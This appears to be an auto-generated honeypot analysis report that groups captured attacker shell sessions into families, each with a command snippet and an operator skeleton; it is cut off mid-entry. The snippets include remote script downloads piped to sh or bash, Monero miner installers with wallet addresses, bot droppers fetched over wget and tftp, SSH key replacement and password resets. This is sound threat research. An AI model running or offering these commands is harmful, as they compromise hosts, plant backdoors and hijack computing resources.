| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b17d9c295f25937e | 07c11c4fe5ab |        6 |               1 |

---

## Family 250

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b3c4f82e95c6ffc8` (Session: `c0a1adac4609`, n_rows=7)

**Medoid Execution Snippet:**
```text
sh
bash
shell
enable
system
linuxshell
/bin/busybox BITCOIN ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('bash', ';'), ('shell', ';'), ('enable', ';'), ('system', ';'), ('linuxshell', ';'), ('busybox', 'EOS')]`

Top operators: [('sh', 1), ('bash', 1), ('shell', 1), ('enable', 1), ('system', 1), ('linuxshell', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b3c4f82e95c6ffc8 | c0a1adac4609 |        7 |               1 |

---

## Family 222

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b5c75766c0615705` (Session: `7c8cef1224f1`, n_rows=3)

**Medoid Execution Snippet:**
```text
cat /etc/issue
nproc
uname -a ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('nproc', ';'), ('uname', 'EOS')]`

Top operators: [('cat', 1), ('nproc', 1), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b5c75766c0615705 | 7c8cef1224f1 |        3 |               1 |

---

## Family 322

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b6cbda9200e5b9c2` (Session: `12ff06508bc0`, n_rows=6)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('Enter', ';'), ('echo', '|'), ('passwd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', 'EOS')]`

Top operators: [('echo', 3), ('cd', 2), ('cat', 2), ('grep', 2), ('passwd', 2), ('rm', 1), ('mkdir', 1), ('chmod', 1), ('wc', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b6cbda9200e5b9c2 | 12ff06508bc0 |        6 |               1 |

---

## Family 354

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b6d5ec625261382a` (Session: `03e56ba68acd`, n_rows=1)

**Medoid Execution Snippet:**
```text
(uname -smr || /bin/uname -smr || /usr/bin/uname -smr) ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', '||'), ('uname', '||'), ('uname', 'EOS')]`

Top operators: [('uname', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b6d5ec625261382a | 03e56ba68acd |        1 |               1 |

---

## Family 196

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b855ba9c8596b880` (Session: `b07bf5743ef2`, n_rows=2)

**Medoid Execution Snippet:**
```text
uname -a
lspci | grep -i --color 'vga\ | 3d\ | 2d' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('lspci', '|'), ('grep', 'EOS')]`

Top operators: [('uname', 1), ('lspci', 1), ('grep', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b855ba9c8596b880 | b07bf5743ef2 |        2 |               1 |

---

## Family 252

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b94be70a4503e51e` (Session: `3dd2050aebfb`, n_rows=3)

**Medoid Execution Snippet:**
```text
sh
shell
ls / ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('ls', 'EOS')]`

Top operators: [('sh', 1), ('shell', 1), ('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b94be70a4503e51e | 3dd2050aebfb |        3 |               1 |

---

## Family 202

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `bb5aa931e9e68723` (Session: `5cdc9af156a3`, n_rows=2)

**Medoid Execution Snippet:**
```text
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s 49Feiu7xYNiMxoAV69hUajG1X6J33AuikbhR6R5xdRJPNg5ac8AQVeq9k9CcayRKCXeDbLhC4ub23bTRT7jFKE8nQHJnL3L
wget http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s 49Feiu7xYNiMxoAV69hUajG1 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', '|'), ('bash', ';'), ('wget', '|'), ('bash', 'EOS')]`

Top operators: [('bash', 2), ('curl', 1), ('wget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| bb5aa931e9e68723 | 5cdc9af156a3 |        2 |               1 |

---

## Family 206

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `bbb4a91d1a2fb384` (Session: `6d13467359cf`, n_rows=3)

**Medoid Execution Snippet:**
```text
ping
sh
/bin/busybox JIGOKU ;
```

**Consensus Skeleton (op, conn pairs):**
`[('ping', ';'), ('sh', ';'), ('busybox', 'EOS')]`

Top operators: [('ping', 1), ('sh', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| bbb4a91d1a2fb384 | 6d13467359cf |        3 |               1 |

---

## Family 180

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `bd4821f227cd507c` (Session: `ec625e224e5e`, n_rows=1)

**Medoid Execution Snippet:**
```text
cat /bin/sh || cat /bin/busybox || cat /bin/bash ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '||'), ('cat', '||'), ('cat', 'EOS')]`

Top operators: [('cat', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| bd4821f227cd507c | ec625e224e5e |        1 |               1 |

---

## Family 182

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `bd59cdedd6dbc682` (Session: `978488572379`, n_rows=12)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
echo -e '\x41\x4b\x34\x37'enable
system
shell
sh
echo -e '\x41\x4b\x34\x37'enable
system
shell
sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('echo', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('echo', ';'), ('system', ';'), ('shell', ';'), ('sh', 'EOS')]`

Top operators: [('system', 3), ('shell', 3), ('sh', 3), ('echo', 2), ('enable', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          |      session |   n_rows |   session_count |
|:-----------------|-------------:|---------:|----------------:|
| bd59cdedd6dbc682 | 978488572379 |       12 |               1 |

---

## Family 77

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `be5eb714f2024496` (Session: `976c68781607`, n_rows=5)

**Medoid Execution Snippet:**
```text
shell
enable
system
linuxshell
/bin/busybox BITCOIN ;
```

**Consensus Skeleton (op, conn pairs):**
`[('shell', ';'), ('enable', ';'), ('system', ';'), ('linuxshell', ';'), ('busybox', 'EOS')]`

Top operators: [('shell', 1), ('enable', 1), ('system', 1), ('linuxshell', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| be5eb714f2024496 | 976c68781607 |        5 |               1 |

---

## Family 241

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `be69e45d60d4e8c7` (Session: `a2a3796e895b`, n_rows=1)

**Medoid Execution Snippet:**
```text
w ;
```

**Consensus Skeleton (op, conn pairs):**
`[('w', 'EOS')]`

Top operators: [('w', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| be69e45d60d4e8c7 | a2a3796e895b |        1 |               1 |

---

## Family 140

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c01c2dcfa4d5f022` (Session: `7ba131b7613f`, n_rows=11)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', 'EOS')]`

Top operators: [('grep', 4), ('cd', 2), ('echo', 2), ('cat', 2), ('wc', 2), ('rm', 1), ('mkdir', 1), ('chmod', 1), ('chpasswd', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c01c2dcfa4d5f022 | 7ba131b7613f |       11 |               1 |

---

## Family 119

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c10d196db1301f46` (Session: `76335d0c8348`, n_rows=1)

**Medoid Execution Snippet:**
```text
wget ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', 'EOS')]`

Top operators: [('wget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c10d196db1301f46 | 76335d0c8348 |        1 |               1 |

---

## Family 329

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c11613a0055e25e1` (Session: `1f0759568b4b`, n_rows=9)

**Medoid Execution Snippet:**
```text
sh
enable
shell
debug shell
cmd
wget http://2.58.149.116/w -O- | sh
curl http://2.58.149.116/c -O- | sh
wget http://2.58.149.116/w -O- | sh
curl http://2.58.149.116/c -O- | sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('enable', ';'), ('shell', ';'), ('debug', ';'), ('cmd', ';'), ('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', ';'), ('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', 'EOS')]`

Top operators: [('sh', 5), ('wget', 2), ('curl', 2), ('enable', 1), ('shell', 1), ('debug', 1), ('cmd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c11613a0055e25e1 | 1f0759568b4b |        9 |               1 |

---

## Family 270

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c5f56da2207846c9` (Session: `7bbeef138825`, n_rows=71)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYmB2fdNzBcU05QhhWW6tSuYcXcyAz8Cp73JmN6TcPu ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cat', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('PH_EXEC_1', ';'), ('>', 'EOS')]`

Top operators: [('cp', 24), ('chmod', 17), ('busybox', 13), ('cd', 10), ('rm', 9), ('>', 9), ('echo', 7), ('wget', 7), ('wd1', 7), ('curl', 6)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c5f56da2207846c9 | 7bbeef138825 |       71 |               1 |

---

## Family 146

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c6da9bbbf44b1009` (Session: `4b517e7a0cf0`, n_rows=3)

**Medoid Execution Snippet:**
```text
cat /etc/issue
curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 49bGaMpdZtB5MqnyAwMk5u9bv3zjpyTE2RnQz2djYCm1goxkSkPuodnW8ayyjNLfLAA72Qm29uJT4RbxCAzbkVH6PxPAZZa
echo firewalla1337 was here hehe ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('curl', '|'), ('bash', ';'), ('echo', 'EOS')]`

Top operators: [('cat', 1), ('curl', 1), ('bash', 1), ('echo', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c6da9bbbf44b1009 | 4b517e7a0cf0 |        3 |               1 |

---

## Family 237

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c7572b0f120882d5` (Session: `865e12c972a2`, n_rows=1)

**Medoid Execution Snippet:**
```text
grep -c ^processor /proc/cpuinfo ;
```

**Consensus Skeleton (op, conn pairs):**
`[('grep', 'EOS')]`

Top operators: [('grep', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c7572b0f120882d5 | 865e12c972a2 |        1 |               1 |

---

## Family 176

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c7d7f150ae1d8a6e` (Session: `9937d3c0114f`, n_rows=7)

**Medoid Execution Snippet:**
```text
cat /etc/issue
lscpu
hostname
pkill cnrig
pkill x86
pkill x86_64
pkill java ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('lscpu', ';'), ('hostname', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', 'EOS')]`

Top operators: [('kill', 4), ('cat', 1), ('lscpu', 1), ('hostname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c7d7f150ae1d8a6e | 9937d3c0114f |        7 |               1 |

---

## Family 99

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c863a7d41782dcb0` (Session: `5bb915bd3822`, n_rows=31)

**Medoid Execution Snippet:**
```text
sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://utrecht.cf/0x83911d24Fx.sh
curl -O http://utrecht.cf/0x83911d24Fx.sh
chmod 777 0x83911d24Fx.sh
sh 0x83911d24Fx.sh
tftp utrecht.cf -c get 0xt984767.sh
chmod 777 0xft6426467.sh
sh 0xft6426467.sh
tftp -r 0xtf2984767.sh -g utrecht.cf
c ...
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('ftpget', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('ftpget', ';'), ('sh', ';'), ('rm', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 10), ('sh', 9), ('chmod', 6), ('tftp', 4), ('rm', 4), ('wget', 2), ('curl', 2), ('ftpget', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c863a7d41782dcb0 | 5bb915bd3822 |       31 |               1 |

---

## Family 235

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c8c98e1094543018` (Session: `9ec9e1206ff2`, n_rows=1)

**Medoid Execution Snippet:**
```text
show ver ;
```

**Consensus Skeleton (op, conn pairs):**
`[('show', 'EOS')]`

Top operators: [('show', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c8c98e1094543018 | 9ec9e1206ff2 |        1 |               1 |

---

## Family 234

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c91ffbb9c8db2bde` (Session: `08f7c79a8b8b`, n_rows=1)

**Medoid Execution Snippet:**
```text
hostname ;
```

**Consensus Skeleton (op, conn pairs):**
`[('hostname', 'EOS')]`

Top operators: [('hostname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c91ffbb9c8db2bde | 08f7c79a8b8b |        1 |               1 |

---

## Family 87

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c99397799ddb8226` (Session: `ab32b09fbe81`, n_rows=2)

**Medoid Execution Snippet:**
```text
uname -a
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46YHk3xuonM9whfqoZK51qNbfyXF2acbJUgz8K24wb1oc4PDanQjwU3iFRH3BcmyKfL1V3qzhiMDABWQ6PwYrTt1AYBVbYt ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('curl', '|'), ('bash', 'EOS')]`

Top operators: [('uname', 1), ('curl', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c99397799ddb8226 | ab32b09fbe81 |        2 |               1 |

---

## Family 320

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c9ba2545cf4f285d` (Session: `a679a4ba8220`, n_rows=14)

**Medoid Execution Snippet:**
```text
sh
shell
ls /
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://31.210.20.109/bins.sh
busybox wget http://31.210.20.109/bins.sh
tftp -r bins.sh -g 31.210.20.109
busybox tftp -r bins.sh -g bins.sh
ftpget -v -u anonymous -p anonymous -P 21 31.210.20.109 bins.sh bins.sh
busybox ftpget - ...
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('ls', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('busybox', ';'), ('tftp', ';'), ('busybox', ';'), ('ftpget', ';'), ('busybox', ';'), ('chmod', ';'), ('busybox', ';'), ('sh', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 5), ('busybox', 4), ('sh', 2), ('shell', 1), ('ls', 1), ('wget', 1), ('tftp', 1), ('ftpget', 1), ('chmod', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c9ba2545cf4f285d | a679a4ba8220 |       14 |               1 |

---

## Family 229

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c9cdf5b70e120764` (Session: `68bbc20b440f`, n_rows=1)

**Medoid Execution Snippet:**
```text
Accept-Encoding: gzip ;
```

**Consensus Skeleton (op, conn pairs):**
`[('Accept-Encoding:', 'EOS')]`

Top operators: [('Accept-Encoding:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c9cdf5b70e120764 | 68bbc20b440f |        1 |               1 |

---

## Family 230

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `ce0e5d6d001e1c42` (Session: `c570a7542c75`, n_rows=3)

**Medoid Execution Snippet:**
```text
echo "Uname: "`uname -a`;echo "ID: "`id`
uname -a
id ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', ';'), ('echo', ';'), ('uname', ';'), ('id', 'EOS')]`

Top operators: [('echo', 2), ('uname', 1), ('id', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ce0e5d6d001e1c42 | c570a7542c75 |        3 |               1 |

---

## Family 184

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `cf3e1f492bbc8328` (Session: `40ec62463a59`, n_rows=9)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
linuxshell
cd /tmp/
echo "senpai" > rootsenpai
cat rootsenpai
rm -rf rootsenpai ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('linuxshell', ';'), ('cd', ';'), ('echo', ';'), ('cat', ';'), ('rm', 'EOS')]`

Top operators: [('enable', 1), ('system', 1), ('shell', 1), ('sh', 1), ('linuxshell', 1), ('cd', 1), ('echo', 1), ('cat', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| cf3e1f492bbc8328 | 40ec62463a59 |        9 |               1 |

---

## Family 198

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `cf7eb6d031cf78fd` (Session: `ba0cd89736b4`, n_rows=8)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
echo -e '\x41\x4b\x34\x37'
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
cd /tmp || cd $(find / -writable | head -n 1)
find / -writable | head -n 1 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('echo', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('cd', '||'), ('cd', ';'), ('find', '|'), ('head', 'EOS')]`

Top operators: [('cd', 7), ('enable', 1), ('system', 1), ('shell', 1), ('sh', 1), ('echo', 1), ('find', 1), ('head', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| cf7eb6d031cf78fd | ba0cd89736b4 |        8 |               1 |

---

## Family 124

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `d02dc2046169c3a0` (Session: `f69ab94f15bb`, n_rows=4)

**Medoid Execution Snippet:**
```text
cat index.html
ls -al
du -h *
rm index.html ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('ls', ';'), ('du', ';'), ('rm', 'EOS')]`

Top operators: [('cat', 1), ('ls', 1), ('du', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d02dc2046169c3a0 | f69ab94f15bb |        4 |               1 |

---

## Family 149

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `d0cde7bfd161ffb9` (Session: `20610f5441d6`, n_rows=1)

**Medoid Execution Snippet:**
```text
curl -L http://104.244.74.191/sep.sh -o sep.sh && chmod +x sep.sh && bash ./sep.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', '&&'), ('chmod', '&&'), ('bash', 'EOS')]`

Top operators: [('curl', 1), ('chmod', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d0cde7bfd161ffb9 | 20610f5441d6 |        1 |               1 |

---

## Family 334

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `d1d079d6ff54184d` (Session: `25ece568439a`, n_rows=2)

**Medoid Execution Snippet:**
```text
echo -e "Eb1S3BrT
Eb1S3BrT" | sudo passwd ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('sudo', 'EOS')]`

Top operators: [('echo', 1), ('sudo', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d1d079d6ff54184d | 25ece568439a |        2 |               1 |

---

## Family 147

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `d2f3475373b13f78` (Session: `a7da41b67814`, n_rows=3)

**Medoid Execution Snippet:**
